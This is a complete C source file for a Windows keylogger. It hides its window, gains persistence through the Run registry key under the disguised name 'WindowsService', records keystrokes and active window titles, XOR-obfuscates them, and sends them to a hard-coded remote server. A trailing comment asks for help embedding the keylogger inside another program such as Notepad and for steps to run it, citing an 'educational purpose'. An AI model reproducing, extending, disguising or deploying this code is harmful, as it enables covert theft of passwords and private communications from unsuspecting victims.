#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdbool.h>
#include <winreg.h>
#include <shlobj.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")

#define SERVER_IP "172.16.155.123"
#define SERVER_PORT 8080
#define RECONNECT_DELAY 10000
#define SERVICE_NAME "WindowsService"
#define ENCRYPTION_KEY "S3cr3tK3y"
#define MAX_BUFFER 1024

// Add this to hide the console window completely.
void HideConsoleWindow() {
    HWND hwnd = GetConsoleWindow();
    if (hwnd != NULL) {
        ShowWindow(hwnd, SW_HIDE);
    }
}

void xor_encrypt(char *data) {
    int key_len = strlen(ENCRYPTION_KEY);
    int data_len = strlen(data);
    for (int i = 0; i < data_len; i++) {
        data[i] = data[i] ^ ENCRYPTION_KEY[i % key_len];
    }
}

SOCKET connect_to_server() {
    WSADATA wsa;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in server;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return INVALID_SOCKET;
    }

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        WSACleanup();
        return INVALID_SOCKET;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);
    server.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        closesocket(sock);
        WSACleanup();
        return INVALID_SOCKET;
    }

    return sock;
}

void send_window_title(SOCKET sock) {
    char title[256];
    HWND foreground = GetForegroundWindow();

    if (foreground) {
        GetWindowText(foreground, title, sizeof(title));

        static char last_title[256] = "";
        if (strcmp(last_title, title) != 0) {
            char buffer[512];
            sprintf(buffer, "\n[Window: %s]\n", title);
            
            xor_encrypt(buffer);
            send(sock, buffer, strlen(buffer), 0);
            
            strcpy(last_title, title);
        }
    }
}

void install_persistence() {
    char path[MAX_PATH];
    HMODULE hModule = GetModuleHandle(NULL);
    GetModuleFileName(hModule, path, MAX_PATH);

    // Registry persistence
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, SERVICE_NAME, 0, REG_SZ, (BYTE*)path, strlen(path)+1);
        RegCloseKey(hKey);
    }
}

// Modified main to use WinMain for GUI application
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Hide any console window that might appear
    HideConsoleWindow();
    
    // Set process priority
    SetPriorityClass(GetCurrentProcess(), IDLE_PRIORITY_CLASS);
    
    // Install persistence
    install_persistence();

    SOCKET sock;
    static bool key_states[256] = {0};

    while (1) {
        sock = connect_to_server();
        
        if (sock != INVALID_SOCKET) {
            while (1) {
                send_window_title(sock);

                for (int key = 8; key <= 190; key++) {
                    if ((GetAsyncKeyState(key) & 0x8000) && !key_states[key]) {
                        char key_str[20] = {0};

                        if (key >= 65 && key <= 90) {
                            sprintf(key_str, "%c", key + 32);
                        } else if (key >= 48 && key <= 57) {
                            sprintf(key_str, "%c", key);
                        } else {
                            switch (key) {
                                case VK_SPACE: strcpy(key_str, " "); break;
                                case VK_RETURN: strcpy(key_str, "[ENTER]\n"); break;
                                case VK_TAB: strcpy(key_str, "[TAB]"); break;
                                case VK_SHIFT: strcpy(key_str, "[SHIFT]"); break;
                                case VK_BACK: strcpy(key_str, "\b"); break;
                                case VK_ESCAPE: strcpy(key_str, "[ESC]"); break;
                                case VK_CONTROL: strcpy(key_str, "[CTRL]"); break;
                                case VK_LWIN: case VK_RWIN: strcpy(key_str, "[WIN]"); break;
                                case VK_MENU: strcpy(key_str, "[ALT]"); break;
                                case VK_CAPITAL: strcpy(key_str, "[CAPSLOCK]"); break;
                                case VK_DELETE: strcpy(key_str, "[DELETE]"); break;
                                case VK_INSERT: strcpy(key_str, "[INSERT]"); break;
                                case VK_HOME: strcpy(key_str, "[HOME]"); break;
                                case VK_END: strcpy(key_str, "[END]"); break;
                                case VK_LEFT: strcpy(key_str, "[LEFT]"); break;
                                case VK_RIGHT: strcpy(key_str, "[RIGHT]"); break;
                                case VK_UP: strcpy(key_str, "[UP]"); break;
                                case VK_DOWN: strcpy(key_str, "[DOWN]"); break;
                                case VK_OEM_1: strcpy(key_str, ";"); break;
                                case VK_OEM_7: strcpy(key_str, "'"); break;
                                case VK_OEM_COMMA: strcpy(key_str, ","); break;
                                case VK_OEM_PERIOD: strcpy(key_str, "."); break;
                                case VK_OEM_MINUS: strcpy(key_str, "-"); break;
                                case VK_OEM_PLUS: strcpy(key_str, "+"); break;
                                case VK_OEM_2: strcpy(key_str, "/"); break;
                                case VK_OEM_3: strcpy(key_str, "`"); break;
                                case VK_OEM_4: strcpy(key_str, "["); break;
                                case VK_OEM_5: strcpy(key_str, "\\"); break;
                                case VK_OEM_6: strcpy(key_str, "]"); break;
                                default: continue;
                            }
                        }

                        xor_encrypt(key_str);
                        if (send(sock, key_str, strlen(key_str), 0) == SOCKET_ERROR) {
                            closesocket(sock);
                            WSACleanup();
                            sock = INVALID_SOCKET;
                            break;
                        }

                        key_states[key] = true;
                    }
                    if (!(GetAsyncKeyState(key) & 0x8000)) {
                        key_states[key] = false;
                    }
                }
                
                if (sock == INVALID_SOCKET) {
                    break;
                }
                
                Sleep(10);
            }
        }

        Sleep(RECONNECT_DELAY);
    }

    return 0;
} 


// this is full for educational purpose make my code to Embedding the Keylogger in another File such as a notepad give me a full code please  then give me how to run this code staps this code is full for educational purpose 